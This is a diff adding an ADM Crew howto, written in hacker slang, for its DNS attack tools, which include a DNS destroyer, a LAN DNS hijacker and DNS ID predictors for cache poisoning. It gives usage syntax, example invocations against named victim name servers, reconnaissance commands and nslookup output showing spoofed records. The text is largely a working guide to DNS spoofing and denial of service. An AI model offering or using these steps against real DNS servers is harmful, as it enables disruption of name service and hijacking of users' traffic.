@@ -1,0 +1,205 @@
+
+             o'             'oooooooo'               !ooo   oooo
+            ooo'            'oooo ooooo'            !ooooo   oooo
+           oooooo'          'oooo  ooooo'          !ooooooo   oooo
+          oooooooo'         'oooo   ooooo'        !ooooooooo   oooo
+         oooo  oooo'        'oooo   ooooo'       !ooooo ooooo   oooo 
+        oooo    oooo'       'oooo   ooooo'      !ooooo   ooooo   oooo
+       oooo      oooo'      'oooo   ooooo'     !ooooo     ooooo   oooo
+      oooo        oooo'     'oooo   ooooo     !ooooo       ooooo   oooo
+     oooo          oooo'    'oooo  ooooo'    !ooooo         oooo    oooo
+    oooo            oooo'   'oooo ooooo     !ooooo           ooo     oooo
+   ooooo            ooooo'  'oooooooo'     !ooooo             o       oooo
+
+
+humm well i've decided to make a lil howto because the ADMid tools are not
+very user friendly for a begginer :),illustred with *Real* example...  
+[ehehe btw pleaze excuse muh lame english ;)..]
+
+
+1: ADMdnsfuckr
+
+ADMdnsfuckr is a program to destroy DNS.
+
+it's very very simple to use !!! :) 
+
+usage:
+
+ADMdnsfuckr <victim>
+
+ex: ADMdnsfuckr joeblow.example
+
+
+
+2: ADMsniffID 
+
+ADMsniffID is a DNS hijacker .. you need to have rewt priv..  Ho ehe it's
+for a LAN only :)
+
+usage:  
+
+ADMsniffID <device> <spoof IP> <spoof NAME> [type 1 or 12 ] 
+
+''by type i mean 1 = TYPE A  12 = TYPE PTR''
+
+ex:
+
+ADMsniffID eth0 31.3.3.7 www.i.m.mucho.horny.ya 12 ( we  hijack TYPE PTR )
+
+so now if som1 does "nslookup <one ip>" on a network they have :).. 
+
+[root@ADM root]#nslookup  1.2.3.4
+Server:  localhost
+Address:  127.0.0.1
+
+Name:    www.i.m.mucho.horny.ya
+Address:  1.2.3.4
+
+
+
+3: --= ADMsnOOfID =--
+
+1) before you need a rewt on a DNS with auth on a domain.
+ (like shok.av.example have auth *.av.example)
+
+ADMsnOOfID is a DNS id predictor  (but u need to have a rewt on a dns or u
+need to priv to sniff the DNS )
+
+usage:
+ADMsnOOfID <device to spoof>  <NS victim> <your domain>  <ip of your dns>
+<type (1,12)> <spoof name> <spoof ip> <ns with auth on spoof ip or name>
+
+ex:
+
+ADMsnOOfID ppp0 NS2.MCI.NET av.example shok.av.example 12 
+           www.i.m.ereet.ya 349.360.23.123  ns2.pr.example ..
+
+
+Well after that when u ask NS2.MCI.NET for 349.360.23.123 u have
+
+[root@ADM root]#nslookup 349.360.23.123  ns2.mci.net
+Server:  ns2.mci.net
+Address:  204.70.57.242
+
+Name:    www.i.m.ereet.ya
+Address:  349.360.23.123
+
+[root@ADM root]#
+
+
+we will use ns2.pr.example because ns2.pr.example has AUTH on 349.360.23.* 
+
+to find out who has AUTH on 349.360.23.*  u just need to do 
+
+[root@ADM root]#host -t NS 23.360.349.in-addr.arpa
+23.360.349.in-addr.arpa name server NS2.pr.example
+23.360.349.in-addr.arpa name server BOW.example
+23.360.349.in-addr.arpa name server NS1.pr.example
+[root@ADM root]#
+
+to know the NS who have AUTH on (for example ) *.pr.example  do
+
+[root@ADM root]#host -t NS pr.example
+pr.example name server NS1.pr.example
+pr.example name server BOW.example
+pr.example name server NS2.pr.example
+[root@ADM root]#
+
+Note: the entry can change!!! u can get NS1 first and when u send a
+second request u get NS2..  :)
+
+Hoo i'm nice today i'give u another example .. for spoof type 1 
+
+ADMsnOOfID ppp0 ns.mci.net av.example shok.av.example 1 wwwkewlya.pr.example
+ 31.3.3.7 ns1.pr.example 
+
+sO..
+
+[root@ADM root]#nslookup wwwkewlya.pr.example ns.mci.net
+Server:  ns.mci.net
+Address:  204.70.128.1
+
+Non-authoritative answer:
+Name:    wwwkewlya.pr.example
+Address:  31.3.3.7
+
+[root@ADM root]# 
+
+Ok that's ALL for ADMsnOOfID :)
+
+
+
+4: ADMnOg00d 
+
+well with ADMnOg00d u dont need to have any rewt on any DNS ... 
+but it still requires rewt on a BOX
+
+it's a DNS ID brutal predictor ( PhEaR !! ) 
+
+usage:
+
+ADMnoG00D <your ip> <dns trust> <domaine trust> <ip victim> <TYPE> <spoof
+name> <spoof ip> <ns.trust.for.the.spoof> [ID]
+
+ex:
+
+ADMnOg00d ppp45.somewhere.net ns1.pr.example pr.example  taz.station.example 12 PheAr.ADM.n0.g00d
+349.360.23.144 ns2.pr.example 7000
+
+(i' start with ID 7000  because i'know the current ID of taz.station.example)
+
+
+i' use ns1.pr.example and the domain *.pr.example only to find ID sO.. when 
+we have found the ID we can send the REAL spoof 
+
+So after that we have 
+
+[root@shok root1]#  nslookup 349.360.23.144 taz.station.example
+Server:  taz.station.example
+Address:  349.98.136.1
+
+Name:    PheAr.ADM.n0.g00d
+Address:  349.360.23.144
+
+yes i'm nice again i'll u give another example for spoof type 1 
+
+ADMnOg00d ppp45.somewhere.net ns1.pr.example pr.example  taz.station.example 1
+w00c0w.pr.example 2.6.0.0 ns1.pr.example 7000
+
+after..
+ nslookup w00c0w.pr.example taz.station.example
+...
+Server:  taz.station.example
+Address:  349.98.136.1
+
+Non-authoritative answer:
+Name:    w00c0w.pr.example
+Address:  2.6.0.0
+
+/* w00w00ify'd w00c0w does ++rool supreme.
+ w00w00ify'd w00c0w does ++rool supreme.
+ w00w00ify'd w00c0w does ++rool supreme.
+ w00w00ify'd w00c0w does ++rool supreme.
+ w00w00ify'd w00c0w does ++rool supreme.
+ w00w00ify'd w00c0w does ++rool supreme.
+ w00w00ify'd w00c0w does ++rool supreme. */
+
+
+5: ADMkillDNS
+
+ADMkillDNS is a BRUTAL  ID spoofer it is the first DNS tools i wrote
+
+(write in Ju 97à)
+
+the included help in here is very complete no need to talk any more about it
+
+
+
+{end}
+
+Cya Ppl  
+
+The ADM Crew 
+
+
+
